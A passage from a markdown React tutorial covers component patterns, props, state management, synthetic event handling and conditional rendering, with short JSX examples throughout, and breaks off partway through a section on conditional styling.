## 37. Component Naming Conventions :

- Naming conventions in React promote consistency, readability, and avoid conflicts :

1. **PascalCase for Components** : Always capitalize the first letter (e.g., `UserDashboard`, `GreetingButton`). This distinguishes components from regular HTML elements (lowercase).
2. **File Naming** : Match the component name, e.g., `Greeting.jsx` or `Greeting.js`. Use `index.js` for default exports in folders.
3. **Props Naming** : Use camelCase (e.g., `userName`, `isActive`).
4. **Event Handlers** : Prefix with `handle` or `on` (e.g., `handleClick`, `onSubmit`).
5. **Custom Hooks** : Prefix with `use` (e.g., `useFetchData`).
6. **Avoid Abbreviations** : Use descriptive names like `ProfilePicture` instead of `ProfPic`.
7. **Folders** : Group related components (e.g., `components/User/UserProfile.jsx`).

- Following these (often enforced by ESLint plugins like `eslint-plugin-react`) makes codebases scalable and easier for teams to navigate.

---

## 38. Component Composition :

- Composition is the practice of building complex UIs by combining simpler components, similar to how functions compose in programming. It promotes reusability and separation of concerns.

#### Key principles :

- **Nesting** : Pass components as children or via props.
- **Props Passing** : Data flows down the component tree.
- **No Inheritance** : React favors composition over class inheritance (use HOCs or render props instead).

Example :

```jsx
function Header() {
  return <h1>Welcome, Akhil!</h1>;
}

function Content() {
  return <p>Your location: Port Washington, NY</p>;
}

function Footer() {
  return <footer>© 2026</footer>;
}

function App() {
  return (
    <div>
      <Header />
      <Content />
      <Footer />
    </div>
  );
}
```

- Here, `App` composes `Header`, `Content`, and `Footer`. This allows independent development and testing of each part.

---

## 39. Reusable Components :

- Reusable components are designed to be used in _multiple places without modification_, _reducing code duplication_. They rely on props for customization.

Design tips :

- **Props-Driven**: Make behavior configurable via props (e.g., `size`, `color`).
- **Default Props**: Provide fallbacks with `defaultProps`.
- **Type Checking**: Use PropTypes or TypeScript for validation.
- **Isolation**: Avoid global state; use context if needed.

Example : A reusable button.

```jsx
import React from "react";
import PropTypes from "prop-types";

function Button({ label, onClick, disabled = false, variant = "primary" }) {
  return (
    <button onClick={onClick} disabled={disabled} className={`btn ${variant}`}>
      {label}
    </button>
  );
}
Button.propTypes = {
  label: PropTypes.string.isRequired,
  onClick: PropTypes.func.isRequired,
  disabled: PropTypes.bool,
  variant: PropTypes.oneOf(["primary", "secondary"]),
};
// Usage: <Button label="Submit" onClick={handleSubmit} />
```

- This button can be reused across forms, modals, etc., with different props.

---

## 40. Presentational Components :

- _Presentational (or "dumb") components_ focus solely on UI rendering. They receive data via props and don't manage _state_ or _side effects_.

#### Characteristics :

- **Input**: Props only.
- **Output**: JSX.
- **No Dependencies**: Minimal imports (e.g., no API calls).
- **Testable**: Easy to snapshot test.

Example:

```jsx
function UserCard({ name, location }) {
  return (
    <div className="user-card">
      <h3>{name}</h3>
      <p>Location: {location}</p>
    </div>
  );
}
```

- Use them for layouts, styles, and static displays. Pair with container components for logic.

---

## 41. Container Components :

- _Container (or "smart") components_ handle logic, state, and data fetching. They wrap presentational components and pass data via props.

#### Characteristics :

- **Stateful** : Manage state, effects.
- **Business Logic** : API calls, computations.
- **Composition** : Render presentational components.

Example :

```jsx
import React, { useState, useEffect } from "react";
import UserCard from "./UserCard"; // Presentational

function UserContainer() {
  const [user, setUser] = useState(null);

  useEffect(() => {
    // Simulate fetch
    setUser({ name: "Akhil", location: "Port Washington, NY" });
  }, []);

  return user ? (
    <UserCard name={user.name} location={user.location} />
  ) : (
    <p>Loading...</p>
  );
}
```

- This pattern (from Dan Abramov's blog) separates concerns, improving maintainability.

---

## 42. Stateless vs Stateful Components :

- **Stateless (Functional without Hooks or Pure)**: No internal state; pure functions of props. Rerender only on prop changes. Example : Simple display components.
  ```jsx
  function Stateless({ message }) {
    return <p>{message}</p>;
  }
  ```
- **Stateful** : Manage internal state (via `useState` or `this.state`). Rerender on state changes. Used for interactive elements.
  ```jsx
  function Stateful() {
    const [count, setCount] = useState(0);
    return <button onClick={() => setCount(count + 1)}>{count}</button>;
  }
  ```
- Stateless are predictable and optimizable (e.g., with `React.memo`); stateful handle dynamics.

---

## 43. Controlled Components :

- _Controlled components_ have their form values managed by _React state_. The component's value is set via props, and changes update state.
- _Advantages_ : Single source of truth, validation, dynamic updates.

Example (input) :

```jsx
function ControlledInput() {
  const [value, setValue] = useState("");

  return (
    <input
      type="text"
      value={value}
      onChange={(e) => setValue(e.target.value)}
    />
  );
}
```

- Ideal for forms where you need to sync, validate, or derive values.

---

## 44. Uncontrolled Components :

- Uncontrolled components manage their own state internally, using DOM refs to access values.
- _Advantages_ : Simpler for one-off forms; integrates with non-React code.

Example:

```jsx
import React, { useRef } from "react";

function UncontrolledInput() {
  const inputRef = useRef(null);

  const handleSubmit = () => {
    alert(inputRef.current.value);
  };

  return (
    <>
      <input type="text" ref={inputRef} defaultValue="Initial" />
      <button onClick={handleSubmit}>Submit</button>
    </>
  );
}
```

- Use when React doesn't need to control the value (e.g., file inputs).

---

## 45. Higher Order Components :

- _Higher-Order Components (HOCs)_ are functions that take a component and return an _enhanced version_, adding behavior without modifying the original.
- _Pattern_ : Reuse logic like authentication, logging.

Example :

```jsx
function withLogger(WrappedComponent) {
  return function Enhanced(props) {
    console.log("Props:", props);
    return <WrappedComponent {...props} />;
  };
}

const LoggedGreeting = withLogger(Greeting);
// Usage: <LoggedGreeting name="Akhil" />
```

- Pros: Composition for cross-cutting concerns. Cons: Can lead to wrapper hell; Hooks often replace HOCs.

---

## 46. Dumb vs Smart Components :

- **Dumb (Presentational)** : Focus on UI; props-only; no state/logic. Reusable, testable.
- **Smart (Container)** : Handle data, state, effects; compose dumb components. App-specific.
- This **dichotomy** (similar to presentational/container) encourages separation : Dumb for views, smart for orchestration. In modern React, Hooks blur the lines, but the principle aids architecture.

---

## 5. <u> Props </u> -

- Props (short for "properties") are the primary mechanism for passing data from parent components to child components in React. They are **read-only** (immutable from the child's perspective) and allow components to be reusable and configurable.
- Props make React components composable : the same component can behave differently or display different content based on the data it receives.

---

## 47. Props Basics :

- Props are passed to a component as a single object (commonly called `props`).
- A functional component receives props as its first (and usually only) argument.
- A class component receives props via `this.props`.
- Props can contain any valid JavaScript value : strings, numbers, booleans, objects, arrays, functions, JSX elements, etc.
- Changing props from inside a child component is not allowed — doing so is a common anti-pattern.

Basic example :

```jsx
// Parent
function App() {
  return <Greeting name="Akhil" location="Port Washington, NY" />;
}

// Child (functional)
function Greeting(props) {
  return (
    <h1>
      Hello, {props.name} from {props.location}!
    </h1>
  );
}
```

---

## 48. Passing Props :

- Props are passed as attributes in JSX, just like HTML attributes :

```jsx
<UserProfile
  userId={123}
  name="Akhil"
  isPremium={true}
  preferences={{ theme: "dark", notifications: true }}
  onLogout={handleLogout}
/>
```

- Attribute names become property names on the `props` object.
- Values that are JavaScript expressions must be wrapped in curly braces `{}`.
- String literals can be written without braces (React converts them automatically).

Multiple ways to pass the same value:

```jsx
<Counter initialValue={5} />           {/* number */}
<Counter initialValue={"5"} />         {/* string */}
<Counter initialValue={5 + 3} />       {/* expression */}
<Counter initialValue={parseInt("42")} /> {/* function call */}
```

---

## 49. Props Destructuring :

- Instead of accessing props via `props.xxx`, you can destructure them in the function parameter list — cleaner and more common in modern React.

```jsx
// Long form
function Greeting(props) {
  return <h1>Hello, {props.name}!</h1>;
}

// Destructured (preferred)
function Greeting({ name, location = "New York" }) {
  return (
    <h1>
      Hello, {name} from {location}!
    </h1>
  );
}
```

- You can also destructure inside the function body:

```jsx
function UserCard(props) {
  const { name, avatarUrl, bio } = props;
  return (
    <div>
      <img src={avatarUrl} alt={name} />
      <h3>{name}</h3>
      <p>{bio}</p>
    </div>
  );
}
```

---

## 50. Default Props :

- Default props provide fallback values when a prop is not passed by the parent.

Two common ways :

1. **Using default parameter values** (modern & recommended for functional components) :

   ```jsx
   function Button({ label = "Click Me", variant = "primary" }) {
     return <button className={`btn-${variant}`}>{label}</button>;
   }
   ```

2. **Using `defaultProps` static property** (used in class components and older code)

   ```jsx
   function Icon({ name, size = 24 }) {
     return <i className={`icon-${name}`} style={{ fontSize: size }} />;
   }

   Icon.defaultProps = {
     size: 24,
   };
   ```

- Default props are applied only when the prop is `undefined` (not when it's `null`).

---

## 51. Props Validation (PropTypes) :

- PropTypes is a runtime type-checking library that helps catch bugs by validating the types and required status of props.
- Installation (if not using Create React App or Vite template that includes it):

```bash
npm install prop-types
```

Usage :

```jsx
import PropTypes from "prop-types";

function UserInfo({ name, age, isActive, avatar }) {
  return (
    <div>
      <img src={avatar} alt={name} />
      <h2>
        {name} ({age})
      </h2>
      <p>Active: {isActive ? "Yes" : "No"}</p>
    </div>
  );
}

UserInfo.propTypes = {
  name: PropTypes.string.isRequired,
  age: PropTypes.number,
  isActive: PropTypes.bool,
  avatar: PropTypes.string,
  // More validators:
  // onClick: PropTypes.func,
  // items: PropTypes.arrayOf(PropTypes.string),
  // user: PropTypes.shape({
  //   id: PropTypes.number.isRequired,
  //   name: PropTypes.string
  // })
};
```

Common validators:

- `PropTypes.string`, `.number`, `.bool`, `.func`, `.object`, `.array`
- `.isRequired`
- `.arrayOf()`, `.objectOf()`, `.shape()`, `.oneOf()`, `.oneOfType()`

- **Note**: PropTypes only runs in development mode — zero cost in production.

---

## 52. Children Prop :

- The special `children` prop contains everything passed between the opening and closing JSX tags.

```jsx
function Card({ children, title }) {
  return (
    <div className="card">
      <h3>{title}</h3>
      <div className="card-content">{children}</div>
    </div>
  );
}

// Usage
<Card title="User Profile">
  <p>Name: Akhil</p>
  <p>Location: Port Washington, NY</p>
  <button>Edit</button>
</Card>;
```

- `children` can be:
- String
- JSX element(s)
- Array of elements
- `null` / `undefined` / `false` (ignored in rendering)
- Very common pattern for layout/wrapper components.

---

## 53. Props Drilling :

- _Props drilling_ is the process of passing props through multiple levels of components when they are needed deeper in the tree.

Example of drilling :

```jsx
function App() {
  const user = { name: "Akhil", theme: "dark" };
  return <Layout user={user} />;
}

function Layout({ user }) {
  return <Sidebar user={user} />;
}

function Sidebar({ user }) {
  return <ThemeToggle user={user} />;
}

function ThemeToggle({ user }) {
  return <button>Toggle {user.theme} theme</button>;
}
```

**Problems** :

- Boilerplate
- Hard to maintain
- Components receive props they don't use

**Solutions** :

- React Context API
- State management libraries (Redux, Zustand, Jotai)
- Component composition / render props / children patterns

---

## 54. Immutable Props :

- Props are **read-only** in the component that receives them.
- Never mutate `props` directly (e.g., `props.name = "new"` — forbidden).
- If you need to derive new data, create new variables or use state.
- Immutability ensures predictability and enables optimizations (e.g., `React.memo`, `shouldComponentUpdate`).

Correct:

```jsx
function Display({ user }) {
  const displayName = user.name.toUpperCase(); // new value, props unchanged
  return <h1>{displayName}</h1>;
}
```

Incorrect:

```jsx
function Bad({ user }) {
  user.name = "Changed"; // Never do this!
  return <h1>{user.name}</h1>;
}
```

---

## 55. Passing Functions as Props :

- Functions are commonly passed as props to allow children to communicate upward (callbacks).
- Naming convention: `on` + event name (e.g., `onClick`, `onSubmit`, `onDelete`).

Example :

```jsx
function Parent() {
  const handleDelete = (id) => {
    console.log("Deleting item", id);
  };

  return <Child onDelete={handleDelete} itemId={42} />;
}

function Child({ onDelete, itemId }) {
  return <button onClick={() => onDelete(itemId)}> Delete </button>;
}
```

- This creates unidirectional data flow: parent → child (via props), child → parent (via callback).

---

## 56. Props vs State :

| Aspect              | Props                                       | State                                        |
| ------------------- | ------------------------------------------- | -------------------------------------------- |
| Owned by            | Parent component                            | The component itself                         |
| Mutable?            | No (read-only in child)                     | Yes (via setState / useState)                |
| Purpose             | Pass data/configuration downward            | Manage internal component data/behavior      |
| Causes re-render?   | Yes (when parent re-renders with new props) | Yes (when setState is called)                |
| Can be passed down? | Yes                                         | No (unless lifted to parent or via context)  |
| Typical usage       | Initial values, callbacks, configuration    | Form inputs, toggles, fetched data, UI state |
| Example             | `<User name="Akhil" />`                     | `const [count, setCount] = useState(0)`      |

- **Key Principle** :  
  "If a piece of data is used by multiple components or needs to be updated over time → consider lifting it to state in a common parent (or using context/store). If it's only used inside one component → keep it as local state."

- Props and state together drive the UI: `UI = f(props, state)`.

---

## 6. <u> State </u> -

- State is any piece of data that can change over time and, when it changes, should trigger a re-render of the component (or parts of the UI). In React, state is what makes components interactive and dynamic. React provides tools to manage state in a predictable and performant way.

---

## 57. State Basics :

- State represents the **internal memory** of a component.
- When state changes, React re-renders the component (and potentially its children).
- State is **local** by default — each component instance has its own state.
- React manages state updates asynchronously and batches them for performance.
- Two main ways to manage state in modern React:
  - `useState` Hook (functional components — recommended)
  - `this.state` / `this.setState` (class components — legacy)

#### Core principle :

- **UI = f(state, props)**  
  Every time state changes, React calls your component function again with the new state → new UI.

---

## 58. useState Hook :

- `useState` is the primary Hook for adding state to functional components. It was introduced in React 16.8.

Syntax:

```jsx
const [state, setState] = useState(initialValue);
```

- Returns a **pair** (array destructuring):
  - `state`: current value
  - `setState`: function to update the value
- Calling `setState` schedules a re-render with the new value.
- `useState` can be called multiple times in one component.

Example:

```jsx
import { useState } from "react";

function Counter() {
  const [count, setCount] = useState(0);

  return (
    <div>
      <p>Count: {count}</p>
      <button onClick={() => setCount(count + 1)}>Increment</button>
    </div>
  );
}
```

---

## 59. Initial State :

- The argument passed to `useState` is the **initial value** — used only on the very first render.

```jsx
const [name, setName] = useState("Akhil"); // string
const [isDark, setIsDark] = useState(false); // boolean
const [user, setUser] = useState({ name: "Akhil", city: "Port Washington" }); // object
const [items, setItems] = useState([]); // array
const [count, setCount] = useState(() => expensiveCalculation()); // lazy init
```

**Lazy initialization** (important for expensive computations):

```jsx
const [data, setData] = useState(() => {
  console.log("This runs only once");
  return fetchInitialData(); // expensive operation
});
```

- The function is called only once during initial render — not on updates.

---

## 60. Updating State :

- Never mutate state directly. Always use the setter function.

Correct :

```jsx
setCount(count + 1);
setUser({ ...user, city: "New York" });
setItems([...items, newItem]);
```

Incorrect (will cause bugs) :

```jsx
count++; // mutation
user.city = "New York"; // direct mutation
items.push(newItem); // mutates original array
```

- `setState` can also accept a function (recommended when depending on previous state) :

```jsx
setCount((prevCount) => prevCount + 1);
```

---

## 61. State Immutability :

- React relies on immutability to detect changes efficiently (especially with `React.memo`, `useMemo`, `useEffect` dependencies).
- **Primitives** (string, number, boolean) : Replacing value is fine.
- **Objects & Arrays** : Always create a **new** reference.

Examples :

```jsx
// Object
setUser((prev) => ({ ...prev, name: "Akhil Updated" }));

// Array - add
setTodos((prev) => [...prev, newTodo]);

// Array - remove
setTodos((prev) => prev.filter((t) => t.id !== idToRemove));

// Array - update
setTodos((prev) =>
  prev.map((todo) =>
    todo.id === targetId ? { ...todo, completed: true } : todo,
  ),
);
```

- Immutability prevents subtle bugs and enables performance optimizations.

---

## 62. Functional State Updates :

- When the new state depends on the previous state, always use the functional form to avoid stale closures.
- Problematic (stale state) :

```jsx
// This may batch and use outdated count
setCount(count + 1);
setCount(count + 1); // might only increment once
```

Correct :

```jsx
setCount((prev) => prev + 1);
setCount((prev) => prev + 1); // guaranteed +2
```

Especially important in :

- Event handlers with multiple updates
- `useEffect` when depending on state
- Rapid user interactions (click spamming)

---

## 63. Multiple State Variables :

- You can (and often should) use multiple `useState` calls instead of one large object.

Preferred :

```jsx
const [firstName, setFirstName] = useState("");
const [lastName, setLastName] = useState("");
const [email, setEmail] = useState("");
```

Less preferred (unless tightly related) :

```jsx
const [form, setForm] = useState({ firstName: "", lastName: "", email: "" });
```

**When to use one object**:

- Form data that is submitted together
- Settings object
- Data that is always updated as a unit

**When to split**:

- Independent pieces of state
- Different update frequency
- Easier testing and debugging

---

## 64. Derived State :

- Derived state is state that can be **computed** from other state or props — **do not store it in state**.

Bad:

```jsx
const [fullName, setFullName] = useState("");
const [firstName, setFirstName] = useState("");
const [lastName, setLastName] = useState("");

useEffect(() => {
  setFullName(`${firstName} ${lastName}`);
}, [firstName, lastName]);
```

Better :

```jsx
const fullName = `${firstName} ${lastName}`.trim();
```

- Use plain variables, `useMemo`, or just compute in render when derived value is cheap.

---

## 65. Lifting State Up :

- When two or more sibling components need to share the same state → **lift it up** to their closest common parent.

Example :

```jsx
function TemperatureInput({ scale, temperature, onTemperatureChange }) {
  return (
    <fieldset>
      <legend>{scale === "c" ? "Celsius" : "Fahrenheit"}</legend>
      <input
        value={temperature}
        onChange={(e) => onTemperatureChange(e.target.value)}
      />
    </fieldset>
  );
}

function Calculator() {
  const [temperature, setTemperature] = useState("");
  const [scale, setScale] = useState("c");

  const handleCChange = (value) => {
    setTemperature(value);
    setScale("c");
  };

  const handleFChange = (value) => {
    setTemperature(value);
    setScale("f");
  };

  return (
    <>
      <TemperatureInput
        scale="c"
        temperature={temperature}
        onTemperatureChange={handleCChange}
      />
      <TemperatureInput
        scale="f"
        temperature={temperature}
        onTemperatureChange={handleFChange}
      />
    </>
  );
}
```

- State lives in `Calculator` → both inputs stay in sync.

---

## 66. Local vs Global State :

- **Local State** : Managed inside one component using `useState` or `useReducer`. Best for UI-specific concerns (toggle, form input, counter).

- **Global State** : State that many components need to access or update.
  Common solutions :
  - React Context API (built-in)
  - Zustand, Jotai, Recoil (lightweight)
  - Redux, MobX (traditional / complex apps)
- Rule of thumb :
  > Keep state as local as possible. Only lift or globalize when truly needed.

---

## 67. State Synchronization :

- Avoid manually keeping two pieces of state in sync — it leads to bugs.

Anti-pattern :

```jsx
const [count, setCount] = useState(0);
const [double, setDouble] = useState(0);

useEffect(() => {
  setDouble(count * 2);
}, [count]);
```

Better :

```jsx
const [count, setCount] = useState(0);
const double = count * 2; // derived, always correct
```

- If sync is truly required (rare), prefer derived values or controlled components.

---

## 68. State Anti-Patterns :

1. **Direct mutation of state**  
   `count++`, `user.name = "new"`, `items.push()`
2. **Storing derived/computed values in state**  
   Full name, totals, filtered lists
3. **Using state for what should be a ref**  
   Storing previous values, DOM nodes, timers → use `useRef`
4. **Overusing global state**  
   Putting every toggle, form field, etc., into Redux/Context
5. **Ignoring stale closures**  
   Using non-functional updates in rapid-succession scenarios
6. **Storing JSX in state**  
   `setContent(<div>...</div>)` → return JSX directly or use components
7. **Resetting state incorrectly**  
   Using `setState(initial)` instead of a key or reset function

Correct reset example :

```jsx
function Form() {
  const [key, setKey] = useState(0);
  const reset = () => setKey((prev) => prev + 1);

  return <input key={key} />; // remounts component
}
```

- Mastering state management is one of the most important skills in React — it directly affects performance, bug frequency, and maintainability.

---

## 7. <u> Event Handling </u> -

- React provides a consistent, cross-browser way to handle DOM events through **Synthetic Events**. These events wrap native browser events and behave predictably across different browsers and devices. React's event system is one of the key reasons developers find event handling simpler and more reliable compared to vanilla JavaScript.

---

## 69. Synthetic Events :

- React creates a **SyntheticEvent** object that normalizes event properties and behavior across browsers.

Key characteristics :

- **Cross-browser consistency** — properties like `event.preventDefault()`, `event.stopPropagation()`, `event.target`, `event.currentTarget`, `event.key`, etc. work the same everywhere.
- **Event pooling** — for performance, React pools (reuses) event objects. After the event handler runs, the event object is cleared (all properties become `null`).
- **Nullified properties** — if you need to access event properties asynchronously (e.g., in a `setTimeout`), you must call `event.persist()` or store needed values beforehand.

Example of pooling issue :

```jsx
function handleClick(event) {
  // This works synchronously
  console.log(event.target.tagName);

  setTimeout(() => {
    // This will log null (because event is pooled and reset)
    console.log(event.target.tagName);

    // Fix 1: Persist the event
    event.persist();
    setTimeout(() => console.log(event.target.tagName), 1000);

    // Fix 2: Store value immediately
    const targetTag = event.target.tagName;
    setTimeout(() => console.log(targetTag), 1000);
  }, 1000);
}
```

- Modern recommendation: Prefer storing values explicitly over `persist()` (deprecated in React 18+ in many cases).

---

## 70. Event Binding :

- In React, event handlers are attached using camelCase property names (e.g., `onClick`, `onChange`, `onSubmit`).

Two main ways to define handlers :

1. **Class components** (legacy)

   ```jsx
   class Button extends React.Component {
     constructor(props) {
       super(props);
       // Bind in constructor (most common pattern)
       this.handleClick = this.handleClick.bind(this);
     }

     handleClick() {
       console.log("Clicked!");
     }

     render() {
       return <button onClick={this.handleClick}>Click</button>;
     }
   }
   ```

2. **Functional components** (modern — preferred)
   - Use arrow functions (lexical `this`) or define inside component (new function on each render)

   ```jsx
   function Button() {
     // Option 1: Define inside render (new function each time)
     const handleClick = () => {
       console.log("Clicked!");
     };

     // Option 2: Memoized with useCallback (better for performance)
     const handleClickMemo = useCallback(() => {
       console.log("Clicked!");
     }, []);

     return <button onClick={handleClick}>Click</button>;
   }
   ```

- **Performance note**: Inline arrow functions (`onClick={() => doSomething()}`) create a new function on every render. Use `useCallback` when passing handlers to memoized children or when performance is critical.

---

## 71. Inline Event Handlers :

- You can define handlers directly in JSX (common for simple cases):

```jsx
<button onClick={() => alert("Clicked!")}>Click me</button>
```

- _Pros_ : Quick and readable for trivial logic.
- _Cons_ : Creates new function every render → can hurt performance when passed to many children or m-emoized components.
- Best practice: Define handler as a named function or use `useCallback`.

---

## 72. Passing Arguments to Handlers :

- Three common patterns :

1. **Arrow function wrapper** (most common)

   ```jsx
   <button onClick={() => handleDelete(item.id)}>Delete</button>
   ```

2. **Bind in render** (less common now)

   ```jsx
   <button onClick={handleDelete.bind(null, item.id)}>Delete</button>
   ```

3. **Using data attributes** (useful in loops)

   ```jsx
   <button data-id={item.id} onClick={handleDelete}>
     Delete
   </button>;

   function handleDelete(e) {
     const id = e.currentTarget.dataset.id;
     // ...
   }
   ```

- Recommendation: Use arrow function wrapper unless you have hundreds/thousands of elements.

---

## 73. Event Delegation :

- React uses a single event listener at the root of the document (event delegation) rather than attaching listeners to every DOM node.

Benefits:

- Better performance (fewer listeners)
- Works even when elements are added/removed dynamically
- Consistent behavior across browsers
- You almost never need to worry about manual delegation in React — it’s handled automatically.

---

## 74. Prevent Default :

- Many browser events have default behavior (e.g., form submit reloads page, link click navigates).
- Use `event.preventDefault()` to stop it :

```jsx
function Form() {
  const handleSubmit = (e) => {
    e.preventDefault(); // stops page reload
    console.log("Form submitted");
    // handle form data
  };

  return (
    <form onSubmit={handleSubmit}>
      <input type="text" />
      <button type="submit">Send</button>
    </form>
  );
}
```

- Common use cases: forms, links (`<a onClick={...}>`), drag-and-drop.

---

## 75. Stop Propagation :

- `event.stopPropagation()` prevents the event from bubbling up to parent elements.

```jsx
<div onClick={() => console.log("Parent clicked")}>
  <button
    onClick={(e) => {
      e.stopPropagation();
      console.log("Button clicked");
    }}
  >
    Click me
  </button>
</div>
```

- Clicking button logs only "Button clicked" (parent handler is not triggered).
- Use carefully — overusing can make event flow hard to reason about.

---

## 76. Keyboard Events :

- React normalizes keyboard events across browsers.

Common events :

- `onKeyDown`, `onKeyPress` (deprecated), `onKeyUp`
- Properties: `event.key`, `event.code`, `event.ctrlKey`, `event.shiftKey`, `event.metaKey`, `event.altKey`

Example — Enter key submit :

```jsx
function SearchInput() {
  const handleKeyDown = (e) => {
    if (e.key === "Enter") {
      console.log("Search:", e.target.value);
    }
  };

  return (
    <input onKeyDown={handleKeyDown} placeholder="Press Enter to search" />
  );
}
```

- Useful keys : `"Escape"`, `"ArrowUp"`, `"ArrowDown"`, `"Tab"`, `" "`, etc.

---

## 77. Mouse Events :

Common mouse events in React :

- `onClick`, `onDoubleClick`
- `onMouseDown`, `onMouseUp`, `onMouseEnter`, `onMouseLeave`, `onMouseOver`, `onMouseOut`
- `onContextMenu` (right-click)
- Properties: `event.clientX`, `event.clientY`, `event.pageX`, `event.pageY`, `event.screenX`, `event.screenY`, `event.button`

Example — hover detection :

```jsx
function HoverCard() {
  const [isHovered, setIsHovered] = useState(false);

  return (
    <div
      onMouseEnter={() => setIsHovered(true)}
      onMouseLeave={() => setIsHovered(false)}
      style={{ background: isHovered ? "#f0f0f0" : "white" }}
    >
      Hover over me
    </div>
  );
}
```

---

## 78. Form Events :

Most important form events :

- `onSubmit` — on `<form>`
- `onChange` — on inputs, select, textarea (fires on every keystroke/value change)
- `onInput` — similar to `onChange` but lower-level
- `onFocus`, `onBlur`
- `onInvalid` — for form validation

Controlled input example:

```jsx
function LoginForm() {
  const [email, setEmail] = useState("");

  return (
    <form
      onSubmit={(e) => {
        e.preventDefault();
        console.log(email);
      }}
    >
      <input
        type="email"
        value={email}
        onChange={(e) => setEmail(e.target.value)}
        placeholder="Email"
      />
      <button type="submit">Login</button>
    </form>
  );
}
```

---

## 79. Custom Events :

- React doesn’t have native custom events like the DOM’s `CustomEvent`, but you can simulate them by passing callback functions as props.

Pattern (very common):

```jsx
// Child
function CustomButton({ onCustomAction }) {
  const trigger = () => {
    onCustomAction?.({ message: "Something happened", value: 42 });
  };

  return <button onClick={trigger}>Trigger Custom Event</button>;
}

// Parent
function Parent() {
  const handleCustom = (data) => {
    console.log("Custom event received:", data);
  };

  return <CustomButton onCustomAction={handleCustom} />;
}
```

For more complex needs (pub/sub across distant components), use :

- Context + state
- Custom hooks
- State management libraries (Zustand, Jotai, Redux)

**Best practices (2026 React) :**

- Prefer named handler functions over inline arrows when passing to children
- Use `useCallback` for expensive or frequently passed handlers
- Always `e.preventDefault()` for form submit and anchor tags when needed
- Avoid `e.persist()` — prefer capturing values early
- Keep event handlers small and focused — move complex logic to custom hooks or state updaters

---

## 8. <u> Conditional Rendering </u> -

- Conditional rendering in React refers to showing or hiding parts of the UI based on certain conditions (usually state, props, or other data). React has **no built-in directives** like `v-if` (Vue) or `*ngIf` (Angular). Instead, you use plain JavaScript control flow inside JSX or before the `return` statement.
- All techniques below rely on the fact that JSX expressions can evaluate to:
- JSX elements
- Strings / numbers
- `null` / `undefined` / `false` / `true` → these are **not rendered** in the DOM

---

## 80. if Statements :

- Use regular `if` statements **outside** the JSX `return` to decide what to render.
- Most readable for complex logic or multiple branches.

```jsx
function Dashboard({ isLoggedIn, userRole }) {
  let content;

  if (!isLoggedIn) {
    content = <LoginPrompt />;
  } else if (userRole === "admin") {
    content = <AdminPanel />;
  } else if (userRole === "moderator") {
    content = <ModeratorTools />;
  } else {
    content = <UserDashboard />;
  }

  return (
    <div className="dashboard">
      <h1>Welcome</h1>
      {content}
    </div>
  );
}
```

- Alternative : Early return pattern (very common)

```jsx
function Profile({ user }) {
  if (!user) {
    return <div>Please log in to view your profile.</div>;
  }

  if (user.isBanned) {
    return <div>Your account has been suspended.</div>;
  }

  return (
    <div>
      <h1>{user.name}</h1>
      <p>Location: {user.location}</p>
    </div>
  );
}
```

- **When to use** : Complex conditions, multiple return paths, early exits.

---

## 81. Ternary Operator :

- The most common inline conditional pattern in JSX.
- Syntax : `condition ? trueExpression : falseExpression`

```jsx
function Greeting({ isLoggedIn, name = "Guest" }) {
  return (
    <div>
      {isLoggedIn ? <h1>Welcome back, {name}!</h1> : <h1>Please sign in</h1>}

      <p>You are {isLoggedIn ? "logged in" : "not logged in"}.</p>
    </div>
  );
}
```

- Nested ternaries (use sparingly — can become hard to read) :

```jsx
{
  status === "loading" ? (
    <Spinner />
  ) : status === "error" ? (
    <ErrorMessage message="Failed to load data" />
  ) : (
    <DataList items={items} />
  );
}
```

- **Best practice**: Keep ternaries shallow (1–2 levels). Extract to variables or early returns for deeper logic.

---

## 82. Logical && Operator :

- _Short-circuit evaluation_ : renders the right side **only if** the left side is truthy.
- Very popular for "show this if condition is true, otherwise nothing".

```jsx
function Notification({ unreadCount }) {
  return (
    <div>
      <h2>Messages</h2>
      {unreadCount > 0 && <span className="badge">{unreadCount} new</span>}
      {isAdmin && <AdminToolbar />}
    </div>
  );
}
```

- Also useful with falsy checks :

```jsx
{
  error && <div className="error">{error}</div>;
}
{
  items.length === 0 && <p>No items found.</p>;
}
```

- **Caution** : Be careful with `0`, `""`, etc. — they are falsy.

```jsx
{
  count && <p>You have {count} items</p>;
} // Won't show when count = 0
```

- Fix : Use explicit comparison

```jsx
{
  count !== 0 && <p>You have {count} items</p>;
}
{
  !!count && <p>You have {count} items</p>;
} // double negation
```

---

## 83. Switch Statements :

- Use `switch` **outside** JSX when you have many discrete cases.

```jsx
function StatusBadge({ status }) {
  let badgeClass;
  let label;

  switch (status) {
    case "success":
      badgeClass = "bg-green-500";
      label = "Success";
      break;
    case "warning":
      badgeClass = "bg-yellow-500";
      label = "Warning";
      break;
    case "error":
      badgeClass = "bg-red-500";
      label = "Error";
      break;
    default:
      badgeClass = "bg-gray-500";
      label = "Unknown";
  }
  return <span className={`badge ${badgeClass}`}>{label}</span>;
}
```

- Alternative: Object lookup (often cleaner)

```jsx
const statusStyles = {
  success: { class: "bg-green-500", label: "Success" },
  warning: { class: "bg-yellow-500", label: "Warning" },
  error: { class: "bg-red-500", label: "Error" },
};

function StatusBadge({ status }) {
  const style = statusStyles[status] || {
    class: "bg-gray-500",
    label: "Unknown",
  };
  return <span className={`badge ${style.class}`}>{style.label}</span>;
}
```

## 84. Conditional Components :

- Render different component types based on condition.

```jsx
function PageContent({ role }) {
  return (
    <main>
      {role === "admin" ? <AdminView /> : <UserView />}
      {/* or */}
      {role === "admin" && <AdminOnlyFeatures />}
    </main>
  );
}
```

- Also common : Conditional import (dynamic) with `React.lazy` + `Suspense`

```jsx
const AdminPanel = React.lazy(() => import("./AdminPanel"));

return isAdmin ? (
  <Suspense fallback={<Loading />}>
    <AdminPanel />
  </Suspense>
) : (
  <RegularDashboard />
);
```

---

## 85. Guard Clauses :

- Guard clauses are early returns that handle invalid/edge cases first.
- Very clean pattern for components with preconditions.

```jsx
function UserProfile({ user, isLoading }) {
  if (isLoading) return <LoadingSpinner />;
  if (!user) return <NotFound message="User not found" />;
  if (user.isPrivate && !user.isFriend) {
    return <PrivateProfileMessage />;
  }

  // Main render
  return (
    <div>
      <Avatar src={user.avatar} />
      <h1>{user.name}</h1>
      {/* ... */}
    </div>
  );
}
```

---

## 86. Conditional Styling :

- Apply classes or inline styles conditionally.

1. **Class names** (most common) :

   ```jsx
   <div className={`card ${isFeatured ? "featured" : ""} ${isDark ? "dark-mode" : ""}`}>
   ```

   Libraries that help :
   - `clsx` / `classnames`
   - Tailwind merge (`twMerge`, `cn` helper)

   ```jsx
   import { cn } from "@/lib/utils";

